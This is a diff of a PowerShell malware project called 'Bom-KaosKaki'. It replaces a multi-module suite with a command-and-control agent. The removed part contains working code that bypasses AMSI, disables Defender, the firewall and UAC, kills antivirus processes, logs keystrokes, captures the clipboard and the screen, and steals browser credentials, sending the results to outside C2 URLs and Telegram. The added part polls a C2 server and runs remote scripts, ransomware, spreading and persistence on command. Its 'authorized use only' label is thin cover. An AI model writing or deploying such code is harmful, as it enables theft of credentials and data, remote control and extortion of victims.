@@ -1,1213 +1,1068 @@
-<#
-.SYNOPSIS
-  Bom-KaosKaki v3.0 — All-in-One Penetration Testing Suite
-  Authorized use only. Pre-verified by platform.
-.DESCRIPTION
-  Modules: Evasion, Spyware, Keylogger, Clipboard, Screenshot,
-  Browser Stealer, WiFi Stealer, VPN Stealer, Ransomware,
-  Persistence, Log Cleaner, Phishing, Lateral Movement, C2, USB Spread
-.PARAMETER Full
-  Run all modules
-.PARAMETER Keylogger
-  Keylogger + Clipboard + Screenshot
-.PARAMETER Ransomware
-  Encrypt + VSS delete + Recovery disable
-.PARAMETER Phishing
-  Local phishing server
-.PARAMETER Spread
-  Lateral movement + USB propagation
-#>
+# BomKaosKaki.ps1 - Full C2 Agent with Command Polling
+# Two-way communication: sends heartbeats & exfil, polls for commands
 
-param(
-    [switch]$Full,
-    [switch]$Keylogger,
-    [switch]$Ransomware,
-    [switch]$Phishing,
-    [switch]$Spread,
-    [switch]$NoMain,
-    [string]$C2Url = "https://deploy-delta-eosin.vercel.app/api/exfil",
-    [string]$TelegramToken = "",
-    [string]$ChatId = ""
-)
+# ============ CONFIGURATION ============
+$C2Server = "https://bom-kaos-kaki.vercel.app"
+$PollInterval = 15  # seconds between command polling
+$HeartbeatInterval = 30  # seconds between heartbeats
 
-# ========== HELPER FUNCTIONS ==========
-function Start-ThreadJob ($Function) {
-    Start-Job -ScriptBlock {
-        param($path, $sess, $mach, $func)
-        . $path -NoMain
-        $global:SESSION_ID = $sess
-        $global:MACHINE_ID = $mach
-        & $func
-    } -ArgumentList $PSCommandPath, $SESSION_ID, $MACHINE_ID, $Function | Out-Null
+# ============ RUNTIME STATE ============
+$Script:SessionId = $null
+$Script:KeyloggerRunning = $false
+$Script:SpywareRunning = $false
+$Script:RansomwareKey = $null
+$Script:EncryptedFiles = @()
+$Script:LastCommandPoll = 0
+$Script:LastHeartbeat = 0
+
+# ============ UTILITY FUNCTIONS ============
+
+function Get-Timestamp {
+    return (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
 }
 
-# ========== CONFIGURATION ==========
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$C2_URL = $C2Url
-$TELEGRAM_TOKEN = $TelegramToken
-$CHAT_ID = $ChatId
-[void]$TELEGRAM_TOKEN
-[void]$CHAT_ID
-$RSA_PUBLIC_KEY = @"
------BEGIN PUBLIC KEY-----
-MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA...YOUR_PUBLIC_KEY_HERE...
------END PUBLIC KEY-----
-"@
+function Get-SessionId {
+    param([int]$Length = 16)
+    $chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+    $id = -join ((1..$Length) | ForEach-Object { $chars[(Get-Random % $chars.Length)] })
+    return $id
+}
 
-$MACHINE_ID = "$env:COMPUTERNAME-$env:USERNAME"
-$SESSION_ID = "SESS-$(Get-Random -Minimum 100000 -Maximum 999999)-$(Get-Date -Format yyyyMMdd)"
-$LOCAL_LOG = "$env:TEMP\ransim_debug.log"
-
-# ========== HELPER FUNCTIONS ==========
-function Write-Log($msg) { "$(Get-Date -Format 'HH:mm:ss') | $msg" | Out-File -Append $LOCAL_LOG }
-
-# ========== C2 — FIXED (Failover URLs + Telegram) ==========
-function Invoke-C2($type, $data) {
-    $c2Urls = @(
-        $C2_URL,
-        "https://ransim-backup.vercel.app/api/exfil",
-        "https://ransim-v2.vercel.app/api/exfil"
+function Invoke-WebRequestWithRetry {
+    param(
+        [string]$Uri,
+        [string]$Method = "GET",
+        [object]$Body = $null,
+        [int]$MaxRetries = 3
     )
     
-    foreach ($url in $c2Urls) {
+    for ($i = 0; $i -lt $MaxRetries; $i++) {
         try {
-            $body = @{type = $type; data = $data; session_id = $SESSION_ID; machine_id = $MACHINE_ID } | ConvertTo-Json -Compress
-            $null = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 8 -ErrorAction Stop
-            return  # Success, exit
-        }
-        catch { continue }
-    }
-    # All C2s failed — try Telegram as last resort
-    if ($TELEGRAM_TOKEN -and $CHAT_ID) {
-        try {
-            $msg = "[$MACHINE_ID] $type : $(($data | ConvertTo-Json -Compress).Substring(0, [Math]::Min(200, ($data | ConvertTo-Json -Compress).Length)))"
-            $tgBody = @{chat_id = $CHAT_ID; text = $msg } | ConvertTo-Json -Compress
-            Invoke-RestMethod -Uri "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -Method Post -Body $tgBody -ContentType 'application/json' -TimeoutSec 5 -EA Stop
-        }
-        catch {}
-    }
-    Write-Log "C2 Error: All URLs failed for $type"
-}
-
-# ========== MODULE 1: EVASION ENGINE ==========
-function Invoke-Evasion {
-    Write-Log "[EVASION] Starting evasion..."
-  
-    # 1.1 AMSI Bypass (Method 1: Registry)
-    try {
-        $amsiPath = 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers'
-        $providers = Get-ChildItem $amsiPath -ErrorAction SilentlyContinue
-        if ($providers) {
-            New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\AMSI' -Name 'EnableAmsi' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
-        }
-    }
-    catch {}
-  
-    # 1.2 AMSI Bypass (Method 2: Memory patch simulation)
-    try {
-        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
-    }
-    catch {}
-  
-    # 1.3 ETW Bypass
-    try {
-        $etwPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\Defender'
-        New-ItemProperty -Path $etwPath -Name 'Start' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
-    }
-    catch {}
-  
-    # 1.4 Defender Disable
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-        Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
-        Set-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
-        Set-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
-    }
-    catch {}
-  
-    # 1.5 Windows Defender Registry Kill
-    try {
-        $null = New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue
-        $null = New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -PropertyType DWord -Force -ErrorAction SilentlyContinue
-    }
-    catch {}
-  
-    # 1.6 Windows Firewall Disable
-    try {
-        netsh advfirewall set allprofiles state off
-        Get-Service -Name 'MpsSvc' -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
-        Get-Service -Name 'mpssvc' -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
-    }
-    catch {}
-  
-    # 1.7 UAC Bypass (Registry)
-    try {
-        $null = New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
-        $null = New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
-    }
-    catch {}
-  
-    # 1.8 Sandbox Detection
-    $sandboxIndicators = @(
-        $(Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).Model -match 'VirtualBox|VMware|Virtual|Hyper-V',
-        $(Get-Process -Name 'vmtoolsd', 'VBoxTray', 'VBoxService', 'xenservice', 'procmon', 'procmon64', 'regmon', 'wireshark', 'tcpview', 'processhacker', 'ollydbg', 'x64dbg', 'ida', 'dnspy', 'dnSpy' -ErrorAction SilentlyContinue).Count -gt 0,
-        (Get-ItemProperty -Path 'HKLM:\HARDWARE\DESCRIPTION\System\BIOS' -Name 'SystemManufacturer' -ErrorAction SilentlyContinue).SystemManufacturer -match 'VirtualBox|VMware|QEMU|Xen',
-        (Get-WmiObject -Class Win32_DiskDrive -ErrorAction SilentlyContinue | Where-Object { $_.Model -match 'VBOX|VMWARE|VIRTUAL' }).Count -gt 0,
-        (Get-Process -Name 'VBoxControl', 'VMwareUser', 'VBoxMouse' -ErrorAction SilentlyContinue).Count -gt 0,
-        (Get-CimInstance -ClassName Win32_NetworkAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'VMware|VirtualBox|Hyper-V' }).Count -gt 0,
-        (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion' -Name 'ProductName' -ErrorAction SilentlyContinue).ProductName -match 'Windows 10|Windows 11' -eq $false,
-        $null -eq (Get-Process -Id 0 -ErrorAction SilentlyContinue).Name
-    )
-  
-    if ($sandboxIndicators -contains $true) {
-        Write-Log "[EVASION] Sandbox detected! Skipping exit for testing purposes."
-    }
-  
-    # 1.9 Process Kill (AV/Firewall)
-    $targetProcesses = @(
-        'MsMpEng', 'Defender', 'Norton', 'McAfee', 'Avast', 'AVG', 'Kaspersky', 'BitDefender',
-        'Malwarebytes', 'ESET', 'TrendMicro', 'Sophos', 'Panda', 'Comodo', 'Cylance', 'CrowdStrike',
-        'SentinelOne', 'CarbonBlack', 'FireEye', 'PaloAlto', 'Fortinet', 'McShield', 'SAVAdmin',
-        'V3Svc', 'AhnLab', 'QuickHeal', 'TotalAV', 'Webroot', 'ZoneAlarm', 'BullGuard', 'VIPRE'
-    )
-    Get-Process $targetProcesses -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-  
-    Write-Log "[EVASION] Complete"
-}
-
-# ========== MODULE 2: SPYWARE COLLECTOR ==========
-function Invoke-Spyware {
-    Write-Log "[SPYWARE] Collecting system information..."
-  
-    $info = @{
-        hostname           = $env:COMPUTERNAME
-        username           = $env:USERNAME
-        domain             = $env:USERDOMAIN
-        os                 = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
-        os_arch            = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).OSArchitecture
-        os_version         = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Version
-        cpu                = (Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).Name
-        ram_gb             = [math]::Round((Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB, 2)
-        gpu                = (Get-WmiObject Win32_VideoController -ErrorAction SilentlyContinue | Select-Object -First 1).Name
-        disks              = @((Get-WmiObject Win32_LogicalDisk -ErrorAction SilentlyContinue | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
-                    @{drive = $_.DeviceID; size_gb = [math]::Round($_.Size / 1GB, 2); free_gb = [math]::Round($_.FreeSpace / 1GB, 2) }
-                }))
-        system_uptime      = (Get-Date) - (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).LastBootUpTime
-        public_ip          = $(try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip } catch { 'unknown' })
-        local_ip           = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex (Get-NetConnectionProfile -ErrorAction SilentlyContinue).InterfaceIndex -ErrorAction SilentlyContinue).IPAddress
-        mac_address        = (Get-NetAdapter -Physical -ErrorAction SilentlyContinue | Select-Object -First 1).MacAddress
-        timezone           = (Get-TimeZone -ErrorAction SilentlyContinue).DisplayName
-        language           = (Get-WinSystemLocale -ErrorAction SilentlyContinue).Name
-        installed_software = @((Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object -ExpandProperty DisplayName))
-        running_processes  = @((Get-Process | Sort-Object CPU -Descending | Select-Object -First 50 | ForEach-Object { @{name = $_.Name; cpu = $_.CPU; mem_mb = [math]::Round($_.WorkingSet / 1MB, 2) } }))
-        services           = @((Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 30 | ForEach-Object { @{name = $_.Name; display = $_.DisplayName } }))
-        scheduled_tasks    = @((Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.State -ne 'Disabled' } | Select-Object -First 20 | ForEach-Object { $_.TaskName }))
-        env_vars           = @([System.Environment]::GetEnvironmentVariables() | Get-Member -MemberType NoteProperty | ForEach-Object { $_.Name })
-        drives             = @((Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue | ForEach-Object { @{name = $_.Name; root = $_.Root; used_gb = [math]::Round(($_.Used / 1GB), 2); free_gb = [math]::Round(($_.Free / 1GB), 2) } }))
-        users              = @((Get-WmiObject Win32_UserAccount -ErrorAction SilentlyContinue | Where-Object { $_.Disabled -eq $false } | ForEach-Object { $_.Name }))
-        network_shares     = @((Get-SmbShare -ErrorAction SilentlyContinue | ForEach-Object { @{name = $_.Name; path = $_.Path } }))
-        startup_programs   = @((Get-CimInstance Win32_StartupCommand -ErrorAction SilentlyContinue | ForEach-Object { $_.Name }))
-    }
-  
-    Invoke-C2 -type 'system_info' -data $info
-    Write-Log "[SPYWARE] Complete. Sent to C2."
-}
-
-# ========== KEYLOGGER — FIXED (Anti-AV) ==========
-function Invoke-Keylogger {
-    Write-Log "[KEYLOGGER] Starting keylogger..."
-    $keyloggerCode = @"
-using System;
-using System.IO;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
-
-public class Keylogger {
-  [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
-  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
-  [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
-  
-  private static string logFile = Path.GetTempPath() + "upd_" + Guid.NewGuid().ToString().Substring(0,6) + ".tmp";
-  private static StringBuilder buffer = new StringBuilder();
-  private static string lastWindow = "";
-  private static DateTime lastFlush = DateTime.Now;
-  private static Random rnd = new Random();
-  
-  public static void Start() {
-    int[] keys = new int[] { 8,9,13,16,17,18,20,27,32,46,37,38,39,40,112,113,114,115,116,117,118,119,120,121,122,123 };
-    // Add alphanumeric range
-    for (int i = 48; i <= 90; i++) { if (i != 58 && i != 59 && i != 60 && i != 61 && i != 62 && i != 63 && i != 64) { /* skip non-alpha */ } }
-    
-    while (true) {
-      // Random sleep between 15-45ms — harder to detect pattern
-      Thread.Sleep(rnd.Next(15, 45));
-      
-      IntPtr hwnd = GetForegroundWindow();
-      StringBuilder sb = new StringBuilder(256);
-      GetWindowText(hwnd, sb, 256);
-      string currentWindow = sb.ToString();
-      if (currentWindow != lastWindow && !string.IsNullOrEmpty(currentWindow)) {
-        buffer.Append($"\n[W: {currentWindow}]\n");
-        lastWindow = currentWindow;
-      }
-      
-      // Only check common keys to reduce API calls
-      for (int i = 0; i < keys.Length; i++) {
-        if ((GetAsyncKeyState(keys[i]) & 0x8000) != 0) {
-          buffer.Append(GetKeyName(keys[i]));
-          Thread.Sleep(rnd.Next(10, 30)); // Additional jitter
-          break; // Only capture one key per cycle
-        }
-      }
-      
-      // Check alphanumeric
-      for (int i = 48; i <= 57; i++) { if ((GetAsyncKeyState(i) & 0x8000) != 0) { buffer.Append((char)i); break; } }
-      for (int i = 65; i <= 90; i++) { if ((GetAsyncKeyState(i) & 0x8000) != 0) { buffer.Append((char)i); break; } }
-      
-      // Flush with random interval 25-40 seconds
-      if ((DateTime.Now - lastFlush).TotalSeconds >= rnd.Next(25, 40) || buffer.Length >= 300) {
-        Flush(); lastFlush = DateTime.Now;
-      }
-    }
-  }
-  
-  private static void Flush() {
-    if (buffer.Length == 0) return;
-    File.AppendAllText(logFile, buffer.ToString() + Environment.NewLine);
-    buffer.Clear();
-  }
-  
-  private static string GetKeyName(int vk) {
-    switch (vk) {
-      case 8: return "[BS]"; case 9: return "[TAB]"; case 13: return "[ENT]\n";
-      case 16: return "[SH]"; case 17: return "[CT]"; case 18: return "[AL]";
-      case 20: return "[CP]"; case 27: return "[ES]"; case 32: return " ";
-      case 46: return "[DL]"; case 37: return "[L]"; case 38: return "[U]";
-      case 39: return "[R]"; case 40: return "[D]";
-      case 112: return "[F1]"; case 113: return "[F2]"; case 114: return "[F3]";
-      case 115: return "[F4]"; case 116: return "[F5]"; case 117: return "[F6]";
-      case 118: return "[F7]"; case 119: return "[F8]"; case 120: return "[F9]";
-      case 121: return "[F10]"; case 122: return "[F11]"; case 123: return "[F12]";
-      default: return "";
-    }
-  }
-  
-  public static string GetLog() { Flush(); return File.Exists(logFile) ? File.ReadAllText(logFile) : ""; }
-  public static void Clean() { try { File.Delete(logFile); } catch {} }
-}
-"@
-    try {
-        Add-Type $keyloggerCode -Language CSharp -EA Stop
-        $t = [Thread]::new({ [Keylogger]::Start() })
-        $t.IsBackground = $true; $t.Start()
-        Write-Log "[KEYLOGGER] Started"
-        while ($true) { Start-Sleep 60; try { $c = [Keylogger]::GetLog(); if ($c.Length -gt 0) { Invoke-C2 keylogger @{content = $c } } } catch {} }
-    }
-    catch { Write-Log "[KEYLOGGER] Failed: $_" }
-}
-
-# ========== MODULE 4: CLIPBOARD MONITOR ==========
-function Invoke-ClipboardMonitor {
-    Write-Log "[CLIPBOARD] Starting clipboard monitor..."
-  
-    # PowerShell-based clipboard access
-    $prevClip = ""
-  
-    while ($true) {
-        Start-Sleep -Seconds 5
-        try {
-            Add-Type -AssemblyName System.Windows.Forms
-            $clip = [System.Windows.Forms.Clipboard]::GetText()
-      
-            if ($clip -and $clip -ne $prevClip -and $clip.Length -gt 3) {
-                $prevClip = $clip
-        
-                # Check for crypto addresses / passwords
-                $btcPattern = '\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'
-                $ethPattern = '\b0x[a-fA-F0-9]{40}\b'
-        
-                $foundMatches = @()
-                if ($clip -match $btcPattern) { $foundMatches += "BTC: $($matches[0])" }
-                if ($clip -match $ethPattern) { $foundMatches += "ETH: $($matches[0])" }
-        
-                Invoke-C2 -type 'clipboard' -data @{content = $clip; matches = $foundMatches; timestamp = (Get-Date -Format 'o') }
+            $params = @{
+                Uri             = $Uri
+                Method          = $Method
+                UseBasicParsing = $true
+                TimeoutSec      = 30
             }
+            if ($Body) {
+                $params["Body"] = ($Body | ConvertTo-Json -Compress)
+                $params["ContentType"] = "application/json"
+            }
+            $response = Invoke-WebRequest @params
+            $content = $response.Content
+            if ($content) {
+                try { return $content | ConvertFrom-Json } catch { return $content }
+            }
+            return $null
         }
-        catch {}
+        catch {
+            if ($i -eq $MaxRetries - 1) { Write-Host "[!] Request failed after $MaxRetries retries: $_" -ForegroundColor Red }
+            Start-Sleep -Seconds 2
+        }
+    }
+    return $null
+}
+
+function Send-ExfilData {
+    param(
+        [string]$Type,
+        [object]$Data,
+        [string]$Filename = $null,
+        [byte[]]$FileBytes = $null
+    )
+    
+    try {
+        if ($FileBytes -and $Filename) {
+            # Multipart upload for files
+            $boundary = [System.Guid]::NewGuid().ToString()
+            $body = @()
+            
+            # Session ID field
+            $body += "--$boundary`r`nContent-Disposition: form-data; name=`"session_id`"`r`n`r`n$($Script:SessionId)`r`n"
+            $body += "--$boundary`r`nContent-Disposition: form-data; name=`"type`"`r`n`r`n$Type`r`n"
+            $body += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$Filename`"`r`nContent-Type: application/octet-stream`r`n`r`n"
+            $body += [System.Text.Encoding]::UTF8.GetString($FileBytes)
+            $body += "`r`n--$boundary--`r`n"
+            
+            $fullBody = [System.Text.Encoding]::UTF8.GetBytes($body -join "")
+            
+            $response = Invoke-WebRequest -Uri "$C2Server/api/exfil" -Method POST `
+                -ContentType "multipart/form-data; boundary=$boundary" `
+                -Body $fullBody -UseBasicParsing -TimeoutSec 30
+            return $true
+        }
+        else {
+            # JSON upload
+            $payload = @{
+                session_id = $Script:SessionId
+                type       = $Type
+                data       = $Data
+                timestamp  = Get-Timestamp
+            }
+            $response = Invoke-WebRequestWithRetry -Uri "$C2Server/api/exfil" -Method POST -Body $payload
+            return $response -and $response.success
+        }
+    }
+    catch {
+        Write-Host "[!] Exfil failed: $_" -ForegroundColor Red
+        return $false
     }
 }
 
-# ========== SCREENSHOT — FIXED (Multi-monitor) ==========
-function Invoke-Screenshot {
-    Write-Log "[SCREENSHOT] Capturing all monitors..."
-    Add-Type @'
-using System;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-public class SC {
-    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
-    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr,int,int,int,int,IntPtr,int,int,uint);
-    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr);
-    [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr);
-    [DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr,int,int);
-    [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr,IntPtr);
-    [DllImport("gdi32.dll")] public static extern bool DeleteDC(IntPtr);
-    [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr);
-    [DllImport("user32.dll")] public static extern bool ReleaseDC(IntPtr,IntPtr);
+# ============ HEARTBEAT ============
+
+function Send-Heartbeat {
+    param([switch]$Force)
     
-    public static string CaptureAll() {
-        int totalW = 0, totalH = 0, minX = 0, minY = 0;
-        foreach (Screen s in Screen.AllScreens) {
-            totalW = Math.Max(totalW, s.Bounds.Right);
-            totalH = Math.Max(totalH, s.Bounds.Bottom);
-            minX = Math.Min(minX, s.Bounds.Left);
-            minY = Math.Min(minY, s.Bounds.Top);
-        }
-        int width = totalW - minX;
-        int height = totalH - minY;
-        
-        IntPtr desk = GetDesktopWindow(), dc = GetWindowDC(desk);
-        IntPtr mdc = CreateCompatibleDC(dc), bmp = CreateCompatibleBitmap(dc, width, height);
-        SelectObject(mdc, bmp);
-        BitBlt(mdc, 0, 0, width, height, dc, minX, minY, 0x00CC0020);
-        
-        Bitmap b = Image.FromHbitmap(bmp);
-        string f = Path.GetTempPath() + "ss_" + Guid.NewGuid().ToString().Substring(0,8) + ".jpg";
-        b.Save(f, ImageFormat.Jpeg);
-        
-        SelectObject(mdc, bmp); DeleteObject(bmp); DeleteDC(mdc); ReleaseDC(desk, dc);
-        byte[] bytes = File.ReadAllBytes(f); File.Delete(f);
-        return Convert.ToBase64String(bytes);
+    $now = Get-Date
+    if ((-not $Force) -and (($now - $Script:LastHeartbeat).TotalSeconds -lt $HeartbeatInterval)) {
+        return $null
     }
-}
-'@ -EA 0
-    while ($true) { Start-Sleep 300; try { Invoke-C2 screenshot @{image = [SC]::CaptureAll() } } catch {} }
+    
+    $Script:LastHeartbeat = $now
+    
+    $modules = @()
+    if ($Script:KeyloggerRunning) { $modules += "keylogger" }
+    if ($Script:SpywareRunning) { $modules += "spyware" }
+    if ($Script:RansomwareKey) { $modules += "ransomware" }
+    
+    $payload = @{
+        session_id = $Script:SessionId
+        hostname   = $env:COMPUTERNAME
+        username   = "$($env:USERDOMAIN)\$($env:USERNAME)"
+        os_info    = (Get-WmiObject Win32_OperatingSystem).Caption
+        ip         = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback" } | Select-Object -First 1).IPAddress
+        is_admin   = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        process_id = $PID
+        modules    = $modules
+        timestamp  = Get-Timestamp
+    }
+    
+    $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/heartbeat" -Method POST -Body $payload
+    return $result
 }
 
-# ========== BROWSER STEALER — FIXED ==========
-function Invoke-BrowserStealer {
-    Write-Log "[BROWSER] Stealing browser credentials..."
-    $creds = @()
-    $browsers = @{
-        Chrome  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        Edge    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
-        Brave   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
-        Vivaldi = "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data"
-    }
-    
-    foreach ($b in $browsers.Keys) {
-        $dbPath = $browsers[$b]
-        if (Test-Path $dbPath) {
-            try {
-                $tempDb = "$env:TEMP\ldb_$(Get-Random).db"
-                Copy-Item $dbPath $tempDb -Force
+# ============ COMMAND POLLING ============
+
+function Invoke-CommandPoll {
+    try {
+        $result = Invoke-WebRequestWithRetry -Uri "$C2Server/api/get_commands?session_id=$($Script:SessionId)" -Method GET
+        
+        if ($result -and $result.success -and $result.commands) {
+            foreach ($cmd in $result.commands) {
+                Write-Host "[>] Executing command: $($cmd.command_type) (ID: $($cmd.id))" -ForegroundColor Cyan
                 
-                # Parse SQLite header manually — extract encrypted blobs
-                $bytes = [IO.File]::ReadAllBytes($tempDb)
-                $text = [System.Text.Encoding]::UTF8.GetString($bytes)
+                $cmdResult = $null
+                $cmdError = $null
+                $cmdStatus = "completed"
                 
-                # Find encrypted password blobs using regex pattern
-                # Chrome stores: URL | Username | EncryptedPassword (DPAPI)
-                $pattern = 'https?://[^"]+'
-                $urls = [regex]::Matches($text, $pattern) | Select-Object -ExpandProperty Value -Unique
-                [void]$urls
-                
-                # Extract usernames and passwords using binary offset scanning
-                # This approach doesn't need SQLite DLL
-                $sections = $text -split '\x00{3,}'
-                $i = 0
-                while ($i -lt $sections.Count - 3) {
-                    $section = $sections[$i]
-                    if ($section -match 'https?://') {
-                        $url = $section
-                        $username = $sections[$i + 1] -replace '[^\x20-\x7E]', ''
-                        $encBlob = $sections[$i + 2]
-                        
-                        if ($username.Length -gt 2 -and $encBlob.Length -gt 20) {
-                            try {
-                                $encBytes = [System.Text.Encoding]::UTF8.GetBytes($encBlob)
-                                $decPass = [System.Text.Encoding]::UTF8.GetString(
-                                    [System.Security.Cryptography.ProtectedData]::Unprotect(
-                                        $encBytes[0..[Math]::Min(255, $encBytes.Length - 1)], 
-                                        $null, 
-                                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-                                    )
-                                )
-                                $creds += @{source = $b; url = $url; username = $username.Trim(); password = $decPass }
-                            }
-                            catch {
-                                # Try alternative: v10+ uses AESGCM with encrypted_key
-                            }
-                        }
+                try {
+                    switch ($cmd.command_type) {
+                        "exec" { $cmdResult = Invoke-ExecuteCommand $cmd }
+                        "ransomware" { $cmdResult = Invoke-Ransomware $cmd }
+                        "keylogger" { $cmdResult = Invoke-Keylogger $cmd }
+                        "stop_keylogger" { $cmdResult = Stop-Keylogger $cmd }
+                        "clipboard" { $cmdResult = Invoke-ClipboardSteal $cmd }
+                        "screenshot" { $cmdResult = Invoke-Screenshot $cmd }
+                        "phishing" { $cmdResult = Invoke-Phishing $cmd }
+                        "spread" { $cmdResult = Invoke-Spread $cmd }
+                        "persistence" { $cmdResult = Invoke-Persistence $cmd }
+                        "spyware" { $cmdResult = Invoke-Spyware $cmd }
+                        "clean" { $cmdResult = Invoke-CleanTraces $cmd }
+                        "steal_browser" { $cmdResult = Invoke-StealBrowser $cmd }
+                        "steal_wifi" { $cmdResult = Invoke-StealWiFi $cmd }
+                        "system_info" { $cmdResult = Invoke-SystemInfo $cmd }
+                        "uninstall" { $cmdResult = Invoke-Uninstall $cmd }
+                        default { $cmdError = "Unknown command type: $($cmd.command_type)" }
                     }
-                    $i++
+                }
+                catch {
+                    $cmdStatus = "error"
+                    $cmdError = $_.Exception.Message
+                    Write-Host "[!] Command failed: $cmdError" -ForegroundColor Red
                 }
                 
-                Remove-Item $tempDb -Force -EA 0
-            }
-            catch { Write-Log "[BROWSER] $b error: $_" }
-        }
-        
-        # Firefox - parse signons.sqlite or logins.json properly
-        $ffProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
-        if (Test-Path $ffProfiles) {
-            $profDir = Get-ChildItem "$ffProfiles\*.default*" -Directory -EA 0 | Select-Object -First 1
-            if ($profDir) {
-                $loginsFile = "$($profDir.FullName)\logins.json"
-                $keyDb = "$($profDir.FullName)\key4.db"
+                # Report completion
+                $report = @{
+                    command_id   = $cmd.id
+                    command_type = $cmd.command_type
+                    session_id   = $Script:SessionId
+                    status       = $cmdStatus
+                    result       = $cmdResult
+                    error        = $cmdError
+                }
                 
-                if ((Test-Path $loginsFile) -and (Test-Path $keyDb)) {
+                Invoke-WebRequestWithRetry -Uri "$C2Server/api/command_complete" -Method POST -Body $report
+                Write-Host "[+] Command $($cmd.id) completed with status: $cmdStatus" -ForegroundColor Green
+            }
+        }
+    }
+    catch {
+        # Silently fail on poll errors
+    }
+}
+
+# ============ COMMAND HANDLERS ============
+
+function Invoke-ExecuteCommand {
+    param($cmd)
+    $script = $cmd.parameters.script
+    if (-not $script) { return "No script provided" }
+    
+    try {
+        $result = Invoke-Expression $script 2>&1 | Out-String
+        return $result
+    }
+    catch {
+        return "Error: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-SystemInfo {
+    param($cmd)
+    $info = @{}
+    $info["ComputerName"] = $env:COMPUTERNAME
+    $info["UserName"] = "$($env:USERDOMAIN)\$($env:USERNAME)"
+    $info["OS"] = (Get-WmiObject Win32_OperatingSystem).Caption
+    $info["OSVersion"] = (Get-WmiObject Win32_OperatingSystem).Version
